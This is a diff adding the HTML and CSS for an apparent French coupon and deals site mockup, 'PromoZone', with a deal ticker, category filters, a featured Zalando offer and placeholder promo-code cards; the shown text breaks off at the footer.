@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PromoZone — Bons Plans & Codes Promo</title>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #0d0d0d;
+      --surface: #161616;
+      --surface2: #1e1e1e;
+      --border: #2a2a2a;
+      --accent: #ff4d00;
+      --accent2: #ffb800;
+      --accent3: #00e5a0;
+      --text: #f0ede8;
+      --muted: #7a7570;
+      --tag-bg: #1f1f1f;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'DM Sans', sans-serif;
+      font-size: 15px;
+      line-height: 1.6;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* ─── NOISE OVERLAY ─── */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+      background-size: 200px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* ─── HEADER ─── */
+    header {
+      position: sticky; top: 0;
+      background: rgba(13,13,13,0.85);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+      z-index: 100;
+      padding: 0 2rem;
+    }
+    .header-inner {
+      max-width: 1280px; margin: 0 auto;
+      display: flex; align-items: center; justify-content: space-between;
+      height: 64px; gap: 1.5rem;
+    }
+    .logo {
+      font-family: 'Syne', sans-serif;
+      font-size: 1.4rem; font-weight: 800;
+      letter-spacing: -0.02em; text-decoration: none;
+      display: flex; align-items: center; gap: 0.4rem;
+    }
+    .logo span.z { color: var(--accent); }
+    .logo sup {
+      font-size: 0.55rem; font-weight: 600;
+      background: var(--accent2); color: #000;
+      padding: 1px 5px; border-radius: 3px;
+      letter-spacing: 0.05em; vertical-align: super;
+    }
+    nav { display: flex; gap: 0.25rem; }
+    nav a {
+      color: var(--muted); text-decoration: none;
+      font-size: 0.85rem; font-weight: 500;
+      padding: 0.4rem 0.85rem; border-radius: 6px;
+      transition: all 0.2s;
+    }
+    nav a:hover, nav a.active { color: var(--text); background: var(--surface2); }
+
+    .header-search {
+      display: flex; align-items: center;
+      background: var(--surface2); border: 1px solid var(--border);
+      border-radius: 8px; padding: 0 0.75rem; gap: 0.5rem;
+      flex: 1; max-width: 280px;
+    }
+    .header-search input {
+      background: none; border: none; outline: none;
+      color: var(--text); font-family: inherit; font-size: 0.85rem;
+      padding: 0.5rem 0; width: 100%;
+    }
+    .header-search input::placeholder { color: var(--muted); }
+    .header-search svg { color: var(--muted); flex-shrink: 0; }
+
+    /* ─── HERO ─── */
+    .hero {
+      position: relative; overflow: hidden;
+      padding: 5rem 2rem 4rem;
+      text-align: center;
+    }
+    .hero-blob {
+      position: absolute; top: -120px; left: 50%; transform: translateX(-50%);
+      width: 700px; height: 400px;
+      background: radial-gradient(ellipse, rgba(255,77,0,0.18) 0%, transparent 70%);
+      pointer-events: none;
+    }
+    .hero-eyebrow {
+      display: inline-flex; align-items: center; gap: 0.5rem;
+      font-size: 0.75rem; font-weight: 600; letter-spacing: 0.12em;
+      text-transform: uppercase; color: var(--accent);
+      background: rgba(255,77,0,0.1); border: 1px solid rgba(255,77,0,0.25);
+      border-radius: 999px; padding: 0.3rem 0.9rem; margin-bottom: 1.5rem;
+    }
+    .hero-eyebrow::before { content: '●'; font-size: 0.5rem; animation: blink 1.5s step-start infinite; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+
+    .hero h1 {
+      font-family: 'Syne', sans-serif;
+      font-size: clamp(2.8rem, 7vw, 5.5rem);
+      font-weight: 800; line-height: 1.0;
+      letter-spacing: -0.03em;
+      max-width: 820px; margin: 0 auto 1.25rem;
+    }
+    .hero h1 em { font-style: normal; color: var(--accent); }
+    .hero h1 .gold { color: var(--accent2); }
+
+    .hero-sub {
+      color: var(--muted); font-size: 1.05rem;
+      max-width: 480px; margin: 0 auto 2.5rem;
+    }
+
+    .hero-stats {
+      display: flex; justify-content: center; gap: 3rem; flex-wrap: wrap;
+    }
+    .stat { text-align: center; }
+    .stat-num {
+      font-family: 'Syne', sans-serif; font-size: 2rem;
+      font-weight: 800; line-height: 1;
+    }
+    .stat-num.orange { color: var(--accent); }
+    .stat-num.gold { color: var(--accent2); }
+    .stat-num.green { color: var(--accent3); }
+    .stat-label { color: var(--muted); font-size: 0.8rem; margin-top: 0.2rem; }
+
+    /* ─── TICKER ─── */
+    .ticker-wrap {
+      border-top: 1px solid var(--border);
+      border-bottom: 1px solid var(--border);
+      padding: 0.65rem 0; overflow: hidden;
+      background: var(--surface);
+    }
+    .ticker {
+      display: flex; gap: 2.5rem; width: max-content;
+      animation: ticker 28s linear infinite;
+    }
+    @keyframes ticker { from{transform:translateX(0)} to{transform:translateX(-50%)} }
+    .ticker-item {
+      display: flex; align-items: center; gap: 0.5rem;
+      font-size: 0.8rem; font-weight: 500; white-space: nowrap; color: var(--muted);
+    }
+    .ticker-item .badge {
+      background: var(--accent); color: #fff;
+      font-size: 0.65rem; font-weight: 700; padding: 1px 6px; border-radius: 3px;
+    }
+    .ticker-item .badge.gold { background: var(--accent2); color: #000; }
+    .ticker-item .badge.green { background: var(--accent3); color: #000; }
+
+    /* ─── MAIN LAYOUT ─── */
+    .main-wrap {
+      max-width: 1280px; margin: 0 auto;
+      padding: 2.5rem 2rem 4rem;
+      display: grid;
+      grid-template-columns: 240px 1fr;
+      gap: 2rem;
+      position: relative; z-index: 1;
+    }
+
+    /* ─── SIDEBAR ─── */
+    .sidebar { display: flex; flex-direction: column; gap: 1.5rem; }
+    .sidebar-box {
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 14px; padding: 1.25rem;
+    }
+    .sidebar-title {
+      font-family: 'Syne', sans-serif; font-size: 0.75rem; font-weight: 700;
+      letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted);
+      margin-bottom: 0.9rem;
+    }
+    .filter-list { display: flex; flex-direction: column; gap: 0.25rem; }
+    .filter-btn {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0.5rem 0.7rem; border-radius: 8px; cursor: pointer;
+      transition: all 0.15s; font-size: 0.87rem; color: var(--muted);
+      border: none; background: none; text-align: left; width: 100%;
+    }
+    .filter-btn:hover { background: var(--surface2); color: var(--text); }
+    .filter-btn.active { background: rgba(255,77,0,0.12); color: var(--accent); }
+    .filter-count {
+      font-size: 0.72rem; background: var(--surface2);
+      padding: 1px 7px; border-radius: 99px; color: var(--muted);
+    }
+    .filter-btn.active .filter-count { background: rgba(255,77,0,0.2); color: var(--accent); }
+
+    .sort-select {
+      width: 100%; background: var(--surface2); border: 1px solid var(--border);
+      border-radius: 8px; padding: 0.5rem 0.75rem; color: var(--text);
+      font-family: inherit; font-size: 0.87rem; outline: none; cursor: pointer;
+    }
+
+    /* ─── CONTENT ─── */
+    .content { display: flex; flex-direction: column; gap: 2rem; }
+
+    .section-header {
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .section-title {
+      font-family: 'Syne', sans-serif; font-size: 1.1rem;
+      font-weight: 700; display: flex; align-items: center; gap: 0.6rem;
+    }
+    .section-title .dot {
+      width: 8px; height: 8px; border-radius: 50%; background: var(--accent);
+    }
+    .view-all {
+      font-size: 0.8rem; color: var(--muted); text-decoration: none;
+      border: 1px solid var(--border); padding: 0.3rem 0.8rem;
+      border-radius: 6px; transition: all 0.2s;
+    }
+    .view-all:hover { color: var(--text); border-color: var(--muted); }
+
+    /* ─── FEATURED DEAL ─── */
+    .featured-deal {
+      background: linear-gradient(135deg, #1a0d00 0%, #1a1200 50%, #001a0f 100%);
+      border: 1px solid var(--border); border-radius: 18px; padding: 2rem;
+      position: relative; overflow: hidden;
+      display: grid; grid-template-columns: 1fr auto; gap: 2rem; align-items: center;
+    }
+    .featured-deal::before {
+      content: '';
+      position: absolute; top: -50px; right: -50px;
+      width: 250px; height: 250px;
+      background: radial-gradient(circle, rgba(255,184,0,0.12) 0%, transparent 70%);
+    }
+    .featured-tag {
+      display: inline-flex; align-items: center; gap: 0.4rem;
+      font-size: 0.7rem; font-weight: 700; letter-spacing: 0.1em;
+      text-transform: uppercase; color: var(--accent2);
+      margin-bottom: 0.75rem;
+    }
+    .featured-deal h2 {
+      font-family: 'Syne', sans-serif; font-size: 1.6rem;
+      font-weight: 800; line-height: 1.2; margin-bottom: 0.5rem;
+    }
+    .featured-deal p { color: var(--muted); font-size: 0.9rem; max-width: 360px; margin-bottom: 1.25rem; }
+    .featured-meta { display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+    .expire-badge {
+      display: flex; align-items: center; gap: 0.35rem;
+      font-size: 0.78rem; color: var(--muted);
+    }
+    .expire-badge svg { color: var(--accent2); }
+
+    .featured-code-block { text-align: center; }
+    .discount-pill {
+      font-family: 'Syne', sans-serif; font-size: 3rem; font-weight: 800;
+      color: var(--accent2); line-height: 1;
+      margin-bottom: 0.75rem;
+    }
+    .code-box {
+      background: rgba(0,0,0,0.4); border: 1.5px dashed rgba(255,184,0,0.4);
+      border-radius: 10px; padding: 0.75rem 1.25rem;
+      display: flex; align-items: center; gap: 0.75rem;
+      cursor: pointer; transition: all 0.2s;
+      position: relative;
+    }
+    .code-box:hover { border-color: var(--accent2); background: rgba(255,184,0,0.05); }
+    .code-text {
+      font-family: 'Syne', sans-serif; font-size: 1.1rem;
+      font-weight: 800; letter-spacing: 0.12em; color: var(--accent2);
+    }
+    .copy-btn {
+      background: var(--accent2); color: #000;
+      border: none; border-radius: 6px; padding: 0.35rem 0.7rem;
+      font-size: 0.72rem; font-weight: 700; cursor: pointer;
+      transition: all 0.2s; letter-spacing: 0.05em;
+      font-family: inherit;
+    }
+    .copy-btn:hover { background: #ffc933; }
+    .copied-msg {
+      position: absolute; top: -28px; left: 50%; transform: translateX(-50%);
+      background: var(--accent3); color: #000; font-size: 0.72rem;
+      font-weight: 700; padding: 2px 10px; border-radius: 5px;
+      opacity: 0; transition: opacity 0.3s; white-space: nowrap;
+    }
+    .copied-msg.show { opacity: 1; }
+
+    /* ─── DEALS GRID ─── */
+    .deals-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 1rem;
+    }
+
+    .deal-card {
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 14px; overflow: hidden;
+      transition: border-color 0.2s, transform 0.2s, box-shadow 0.2s;
+      cursor: pointer; display: flex; flex-direction: column;
+    }
+    .deal-card:hover {
+      border-color: #3a3a3a; transform: translateY(-2px);
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+    }
+
+    .card-header {
+      padding: 1.25rem 1.25rem 0;
+      display: flex; align-items: flex-start; justify-content: space-between;
+    }
+    .store-badge {
+      display: flex; align-items: center; gap: 0.5rem;
+      font-size: 0.82rem; font-weight: 600; color: var(--text);
+    }
+    .store-icon {
+      width: 32px; height: 32px; border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1rem; flex-shrink: 0;
+    }
+    .discount-tag {
+      font-family: 'Syne', sans-serif; font-size: 1.4rem;
+      font-weight: 800; color: var(--accent);
+    }
+    .discount-tag.gold { color: var(--accent2); }
+    .discount-tag.green { color: var(--accent3); }
+
+    .card-body { padding: 0.9rem 1.25rem; flex: 1; }
+    .card-title {
+      font-family: 'Syne', sans-serif; font-size: 0.97rem;
+      font-weight: 700; margin-bottom: 0.4rem; line-height: 1.3;
+    }
+    .card-desc { color: var(--muted); font-size: 0.83rem; line-height: 1.5; }
+
+    .card-tags { display: flex; gap: 0.4rem; flex-wrap: wrap; margin-top: 0.75rem; }
+    .tag {
+      font-size: 0.7rem; padding: 0.2rem 0.55rem; border-radius: 5px;
+      background: var(--tag-bg); border: 1px solid var(--border);
+      color: var(--muted); font-weight: 500;
+    }
+    .tag.hot { background: rgba(255,77,0,0.1); border-color: rgba(255,77,0,0.2); color: var(--accent); }
+    .tag.new { background: rgba(0,229,160,0.08); border-color: rgba(0,229,160,0.2); color: var(--accent3); }
+    .tag.exclu { background: rgba(255,184,0,0.08); border-color: rgba(255,184,0,0.2); color: var(--accent2); }
+
+    .card-footer {
+      padding: 1rem 1.25rem;
+      border-top: 1px solid var(--border);
+      display: flex; align-items: center; justify-content: space-between; gap: 0.75rem;
+    }
+    .card-code-wrap {
+      display: flex; align-items: center; gap: 0.5rem; flex: 1; min-width: 0;
+    }
+    .card-code {
+      font-family: 'Syne', sans-serif; font-size: 0.85rem; font-weight: 800;
+      letter-spacing: 0.1em; color: var(--text);
+      background: var(--surface2); border: 1px dashed var(--border);
+      border-radius: 6px; padding: 0.3rem 0.65rem;
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+    }
+    .card-code.no-code { font-weight: 400; font-style: italic; color: var(--muted); font-size: 0.8rem; }
+    .btn-copy-small {
+      border: 1px solid var(--border); background: var(--surface2);
+      color: var(--muted); border-radius: 6px; padding: 0.3rem 0.6rem;
+      font-size: 0.72rem; font-weight: 600; cursor: pointer;
+      transition: all 0.2s; font-family: inherit; white-space: nowrap;
+    }
+    .btn-copy-small:hover { background: var(--accent); border-color: var(--accent); color: #fff; }
+    .votes {
+      display: flex; align-items: center; gap: 0.3rem;
+      font-size: 0.78rem; color: var(--muted);
+    }
+    .vote-up {
+      background: none; border: 1px solid var(--border);
+      border-radius: 6px; padding: 0.25rem 0.5rem;
+      cursor: pointer; transition: all 0.2s; font-size: 0.75rem;
+      color: var(--muted); display: flex; align-items: center; gap: 0.25rem;
+    }
+    .vote-up:hover { border-color: var(--accent3); color: var(--accent3); }
+    .vote-up.voted { background: rgba(0,229,160,0.1); border-color: var(--accent3); color: var(--accent3); }
+
+    /* ─── EXPIRY TIMER ─── */
+    .expiry {
+      display: flex; align-items: center; gap: 0.3rem;
+      font-size: 0.72rem; color: var(--muted);
+    }
+    .expiry.urgent { color: var(--accent); }
+
+    /* ─── NEWSLETTER ─── */
+    .newsletter {
+      background: var(--surface); border: 1px solid var(--border);
+      border-radius: 18px; padding: 2rem;
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 2rem; flex-wrap: wrap;
+    }
+    .newsletter-text h3 {
+      font-family: 'Syne', sans-serif; font-size: 1.2rem;
+      font-weight: 800; margin-bottom: 0.3rem;
+    }
+    .newsletter-text p { color: var(--muted); font-size: 0.87rem; }
+    .newsletter-form {
+      display: flex; gap: 0.5rem; flex: 1; max-width: 400px;
+    }
+    .nl-input {
+      flex: 1; background: var(--surface2); border: 1px solid var(--border);
+      border-radius: 8px; padding: 0.6rem 1rem; color: var(--text);
+      font-family: inherit; font-size: 0.9rem; outline: none;
+      transition: border-color 0.2s;
+    }
+    .nl-input:focus { border-color: var(--accent); }
+    .nl-input::placeholder { color: var(--muted); }
+    .btn-primary {
+      background: var(--accent); color: #fff;
+      border: none; border-radius: 8px; padding: 0.6rem 1.2rem;
+      font-family: 'Syne', sans-serif; font-weight: 700; font-size: 0.85rem;
+      cursor: pointer; transition: all 0.2s; white-space: nowrap;
+    }
+    .btn-primary:hover { background: #ff6020; transform: translateY(-1px); }
+
+    /* ─── FOOTER ─── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 1.5rem 2rem;
+      text-align: center; color: var(--muted); font-size: 0.8rem;
+    }
+    footer a { color: var(--muted); text-decoration: none; }
+    footer a:hover { color: var(--text); }
+
+    /* ─── TOAST ─── */
+    #toast {
+      position: fixed; bottom: 1.5rem; right: 1.5rem;
+      background: var(--accent3); color: #000;
+      font-weight: 700; font-size: 0.85rem;
+      padding: 0.65rem 1.2rem; border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0,229,160,0.35);
+      transform: translateY(80px); opacity: 0;
+      transition: all 0.35s cubic-bezier(0.34,1.56,0.64,1);
+      z-index: 999; pointer-events: none;
+    }
+    #toast.show { transform: translateY(0); opacity: 1; }
+
+    /* ─── RESPONSIVE ─── */
+    @media (max-width: 900px) {
+      .main-wrap { grid-template-columns: 1fr; }
+      .sidebar { flex-direction: row; flex-wrap: wrap; gap: 1rem; }
+      .sidebar-box { flex: 1 1 200px; }
+      .featured-deal { grid-template-columns: 1fr; }
+      .featured-code-block { text-align: left; display: flex; gap: 1.5rem; align-items: center; }
+    }
+    @media (max-width: 600px) {
+      nav { display: none; }
+      .hero h1 { font-size: 2.4rem; }
+      .hero-stats { gap: 1.5rem; }
+      .newsletter { flex-direction: column; }
+      .newsletter-form { width: 100%; max-width: none; }
+    }
+
+    /* ─── ANIMATIONS ─── */
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .deal-card { animation: fadeUp 0.5s ease both; }
+    .deal-card:nth-child(1) { animation-delay: 0.05s; }
+    .deal-card:nth-child(2) { animation-delay: 0.12s; }
+    .deal-card:nth-child(3) { animation-delay: 0.19s; }
+    .deal-card:nth-child(4) { animation-delay: 0.26s; }
+    .deal-card:nth-child(5) { animation-delay: 0.33s; }
+    .deal-card:nth-child(6) { animation-delay: 0.4s; }
+  </style>
+</head>
+<body>
+
+<!-- ─── HEADER ─── -->
+<header>
+  <div class="header-inner">
+    <a href="#" class="logo" style="color:var(--text)">Promo<span class="z">Zone</span><sup>FR</sup></a>
+    <nav>
+      <a href="#" class="active">Bons Plans</a>
+      <a href="#">Codes Promo</a>
+      <a href="#">Flash Deals</a>
+      <a href="#">Boutiques</a>
+    </nav>
+    <div class="header-search">
+      <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+      <input type="text" placeholder="Rechercher un bon plan…" />
+    </div>
+  </div>
+</header>
+
+<!-- ─── TICKER ─── -->
+<div class="ticker-wrap">
+  <div class="ticker" id="ticker">
+    <span class="ticker-item"><span class="badge">HOT</span> Nike — 30% sur les sneakers</span>
+    <span class="ticker-item"><span class="badge gold">EXCLU</span> Apple — AirPods Pro à -20%</span>
+    <span class="ticker-item"><span class="badge green">NEW</span> Fnac — Bon plan gaming ce weekend</span>
+    <span class="ticker-item"><span class="badge">HOT</span> Zalando — Soldes jusqu'à -70%</span>
+    <span class="ticker-item"><span class="badge gold">EXCLU</span> Booking — 15% sur hôtels Europe</span>
+    <span class="ticker-item"><span class="badge green">NEW</span> Amazon — Livraison gratuite sans minimum</span>
+    <span class="ticker-item"><span class="badge">HOT</span> Decathlon — 25% sur les vélos</span>
+    <span class="ticker-item"><span class="badge gold">EXCLU</span> ASOS — Code promo -25% valable aujourd'hui</span>
+    <!-- dupliqué pour loop infini -->
+    <span class="ticker-item"><span class="badge">HOT</span> Nike — 30% sur les sneakers</span>
+    <span class="ticker-item"><span class="badge gold">EXCLU</span> Apple — AirPods Pro à -20%</span>
+    <span class="ticker-item"><span class="badge green">NEW</span> Fnac — Bon plan gaming ce weekend</span>
+    <span class="ticker-item"><span class="badge">HOT</span> Zalando — Soldes jusqu'à -70%</span>
+    <span class="ticker-item"><span class="badge gold">EXCLU</span> Booking — 15% sur hôtels Europe</span>
+    <span class="ticker-item"><span class="badge green">NEW</span> Amazon — Livraison gratuite sans minimum</span>
+    <span class="ticker-item"><span class="badge">HOT</span> Decathlon — 25% sur les vélos</span>
+    <span class="ticker-item"><span class="badge gold">EXCLU</span> ASOS — Code promo -25% valable aujourd'hui</span>
+  </div>
+</div>
+
+<!-- ─── HERO ─── -->
+<section class="hero">
+  <div class="hero-blob"></div>
+  <div class="hero-eyebrow">🔥 Bons plans du moment</div>
+  <h1>Les meilleures <em>promos</em><br>& codes <span class="gold">réduc</span></h1>
+  <p class="hero-sub">Codes vérifiés chaque jour. Économisez sur vos marques préférées en quelques secondes.</p>
+  <div class="hero-stats">
+    <div class="stat"><div class="stat-num orange">1 247</div><div class="stat-label">codes actifs</div></div>
+    <div class="stat"><div class="stat-num gold">348</div><div class="stat-label">nouveaux aujourd'hui</div></div>
+    <div class="stat"><div class="stat-num green">98%</div><div class="stat-label">taux de succès</div></div>
+  </div>
+</section>
+
+<!-- ─── MAIN ─── -->
+<div class="main-wrap">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <div class="sidebar-title">Catégories</div>
+      <div class="filter-list">
+        <button class="filter-btn active" onclick="filterCategory(this,'all')">🛍 Tout voir <span class="filter-count">1247</span></button>
+        <button class="filter-btn" onclick="filterCategory(this,'mode')">👗 Mode <span class="filter-count">312</span></button>
+        <button class="filter-btn" onclick="filterCategory(this,'tech')">💻 High-Tech <span class="filter-count">285</span></button>
+        <button class="filter-btn" onclick="filterCategory(this,'voyage')">✈️ Voyage <span class="filter-count">198</span></button>
+        <button class="filter-btn" onclick="filterCategory(this,'sport')">🏃 Sport <span class="filter-count">156</span></button>
+        <button class="filter-btn" onclick="filterCategory(this,'beaute')">💄 Beauté <span class="filter-count">134</span></button>
+        <button class="filter-btn" onclick="filterCategory(this,'maison')">🏠 Maison <span class="filter-count">162</span></button>
+      </div>
+    </div>
+    <div class="sidebar-box">
+      <div class="sidebar-title">Trier par</div>
+      <select class="sort-select" onchange="sortDeals(this.value)">
+        <option value="popular">🔥 Plus populaires</option>
+        <option value="recent">🆕 Plus récents</option>
+        <option value="expiry">⏳ Expirent bientôt</option>
+        <option value="discount">📉 Plus grosse remise</option>
+      </select>
+    </div>
+    <div class="sidebar-box">
+      <div class="sidebar-title">Boutiques top</div>
+      <div class="filter-list">
+        <button class="filter-btn" onclick="filterStore(this,'amazon')">📦 Amazon</button>
+        <button class="filter-btn" onclick="filterStore(this,'zalando')">👟 Zalando</button>
+        <button class="filter-btn" onclick="filterStore(this,'fnac')">📱 Fnac</button>
+        <button class="filter-btn" onclick="filterStore(this,'asos')">🛒 ASOS</button>
+        <button class="filter-btn" onclick="filterStore(this,'booking')">🏨 Booking</button>
+        <button class="filter-btn" onclick="filterStore(this,'decathlon')">🚴 Decathlon</button>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <div class="content">
+
+    <!-- FEATURED DEAL -->
+    <div>
+      <div class="section-header" style="margin-bottom:1rem">
+        <div class="section-title"><span class="dot"></span> Deal en vedette</div>
+      </div>
+      <div class="featured-deal">
+        <div>
+          <div class="featured-tag">⭐ Sélection PromoZone</div>
+          <h2>Zalando — Soldes <br>été 2025</h2>
+          <p>Jusqu'à 70% de réduction sur des milliers d'articles mode homme, femme & enfants. Livraison et retour gratuits.</p>
+          <div class="featured-meta">
+            <span class="expire-badge">
+              <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+              Expire dans <strong id="countdown" style="color:var(--accent2);margin-left:4px">23:14:07</strong>
+            </span>
+            <span style="font-size:0.78rem;color:var(--muted)">🔥 2 341 utilisations</span>
+          </div>
+        </div>
+        <div class="featured-code-block">
+          <div class="discount-pill">−70%</div>
+          <div class="code-box" onclick="copyCode('ZALAN70', this)">
+            <span class="code-text">ZALAN70</span>
+            <button class="copy-btn">COPIER</button>
+            <span class="copied-msg">✓ Copié !</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- DEALS GRID -->
+    <div>
+      <div class="section-header">
+        <div class="section-title"><span class="dot" style="background:var(--accent2)"></span> Codes promo du jour</div>
+        <a href="#" class="view-all">Voir tout →</a>
+      </div>
+    </div>
+
+    <div class="deals-grid" id="dealsGrid">
+
+      <!-- Card 1 -->
+      <div class="deal-card" data-cat="tech" data-store="amazon">
+        <div class="card-header">
+          <div class="store-badge">
+            <div class="store-icon" style="background:#1a1a00">📦</div>
+            Amazon
+          </div>
+          <div class="discount-tag gold">−25%</div>
+        </div>
+        <div class="card-body">
+          <div class="card-title">Echo Dot 5e génération</div>
+          <div class="card-desc">L'enceinte connectée la plus vendue à prix cassé. Code valable sur toute la gamme Echo.</div>
+          <div class="card-tags">
+            <span class="tag hot">🔥 HOT</span>
+            <span class="tag">High-Tech</span>
+            <span class="tag">Enceinte</span>
+          </div>
+        </div>
+        <div class="card-footer">
+          <div class="card-code-wrap">
+            <span class="card-code">ECHO25FR</span>
+            <button class="btn-copy-small" onclick="copySmall('ECHO25FR', this)">Copier</button>
+          </div>
+          <button class="vote-up" onclick="vote(this)">👍 <span class="vcount">847</span></button>
+        </div>
+      </div>
+
+      <!-- Card 2 -->
+      <div class="deal-card" data-cat="mode" data-store="asos">
+        <div class="card-header">
+          <div class="store-badge">
+            <div class="store-icon" style="background:#0d001a">🛒</div>
+            ASOS
+          </div>
+          <div class="discount-tag">−30%</div>
+        </div>
+        <div class="card-body">
+          <div class="card-title">30% sur tout le site ASOS</div>
+          <div class="card-desc">Code exclusif valable jusqu'à ce soir minuit. Applicable sur les nouvelles collections.</div>
+          <div class="card-tags">
+            <span class="tag exclu">⭐ EXCLU</span>
+            <span class="tag">Mode</span>
+            <span class="tag">Limité</span>
+          </div>
+        </div>
+        <div class="card-footer">
+          <div class="card-code-wrap">
+            <span class="card-code">ASOS30GO</span>
+            <button class="btn-copy-small" onclick="copySmall('ASOS30GO', this)">Copier</button>
+          </div>
+          <button class="vote-up" onclick="vote(this)">👍 <span class="vcount">623</span></button>
+        </div>
+      </div>
+
+      <!-- Card 3 -->
+      <div class="deal-card" data-cat="voyage" data-store="booking">
+        <div class="card-header">
+          <div class="store-badge">
+            <div class="store-icon" style="background:#001030">🏨</div>
+            Booking.com
+          </div>
+          <div class="discount-tag green">−15%</div>
+        </div>
+        <div class="card-body">
+          <div class="card-title">15% sur les hôtels en Europe</div>
+          <div class="card-desc">Valable pour toute réservation en Europe du 1er juillet au 31 août 2025.</div>
+          <div class="card-tags">
+            <span class="tag new">🆕 NEW</span>
+            <span class="tag">Voyage</span>
+            <span class="tag">Été</span>
+          </div>
+        </div>
+        <div class="card-footer">
+          <div class="card-code-wrap">
+            <span class="card-code">BOOK15EU</span>
+            <button class="btn-copy-small" onclick="copySmall('BOOK15EU', this)">Copier</button>
+          </div>
+          <button class="vote-up" onclick="vote(this)">👍 <span class="vcount">1204</span></button>
+        </div>
+      </div>
+
+      <!-- Card 4 -->
+      <div class="deal-card" data-cat="sport" data-store="decathlon">
+        <div class="card-header">
+          <div class="store-badge">
+            <div class="store-icon" style="background:#001a00">🚴</div>
+            Decathlon
+          </div>
+          <div class="discount-tag">−20%</div>
+        </div>
+        <div class="card-body">
+          <div class="card-title">Vélos & trottinettes électriques</div>
+          <div class="card-desc">Profitez de la belle saison avec 20% de remise sur toute la gamme mobilité urbaine.</div>
+          <div class="card-tags">
+            <span class="tag hot">🔥 HOT</span>
+            <span class="tag">Sport</span>
+            <span class="tag">Éco</span>
+          </div>
+        </div>
+        <div class="card-footer">
+          <div class="card-code-wrap">
+            <span class="card-code">DECA20</span>
+            <button class="btn-copy-small" onclick="copySmall('DECA20', this)">Copier</button>
+          </div>
+          <button class="vote-up" onclick="vote(this)">👍 <span class="vcount">512</span></button>
+        </div>
+      </div>
+
+      <!-- Card 5 -->
+      <div class="deal-card" data-cat="tech" data-store="fnac">
+        <div class="card-header">
+          <div class="store-badge">
+            <div class="store-icon" style="background:#1a0000">📱</div>
+            Fnac
+          </div>
+          <div class="discount-tag gold">−50€</div>
+        </div>
+        <div class="card-body">
+          <div class="card-title">50€ offerts sur les smartphones</div>
+          <div class="card-desc">Valable dès 299€ d'achat sur la gamme smartphones Samsung, Apple et Xiaomi.</div>
+          <div class="card-tags">
+            <span class="tag exclu">⭐ EXCLU</span>
+            <span class="tag">Tech</span>
+            <span class="tag">Smartphones</span>
+          </div>
+        </div>
+        <div class="card-footer">
+          <div class="card-code-wrap">
+            <span class="card-code">FNAC50OFF</span>
+            <button class="btn-copy-small" onclick="copySmall('FNAC50OFF', this)">Copier</button>
+          </div>
+          <button class="vote-up" onclick="vote(this)">👍 <span class="vcount">789</span></button>
+        </div>
+      </div>
+
+      <!-- Card 6 -->
+      <div class="deal-card" data-cat="beaute">
+        <div class="card-header">
+          <div class="store-badge">
+            <div class="store-icon" style="background:#1a001a">💄</div>
+            Sephora
+          </div>
+          <div class="discount-tag green">−12%</div>
+        </div>
+        <div class="card-body">
+          <div class="card-title">Bon plan beauté — soins & parfums</div>
+          <div class="card-desc">Remise de 12% sur toutes les marques premium. Sans minimum d'achat, sans conditions.</div>
+          <div class="card-tags">
+            <span class="tag new">🆕 NEW</span>
+            <span class="tag">Beauté</span>
+            <span class="tag">Parfums</span>
+          </div>
+        </div>
+        <div class="card-footer">
+          <div class="card-code-wrap">
+            <span class="card-code no-code">Sans code</span>
+          </div>
+          <button class="vote-up" onclick="vote(this)">👍 <span class="vcount">341</span></button>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- NEWSLETTER -->
+    <div class="newsletter">
+      <div class="newsletter-text">
+        <h3>🔔 Alertes promos instantanées</h3>
+        <p>Soyez le premier informé des meilleures offres du jour.</p>
+      </div>
+      <div class="newsletter-form">
+        <input class="nl-input" type="email" placeholder="votre@email.fr" />
+        <button class="btn-primary" onclick="subscribeNewsletter()">Alerter moi</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ─── FOOTER ─── -->
+<footer>
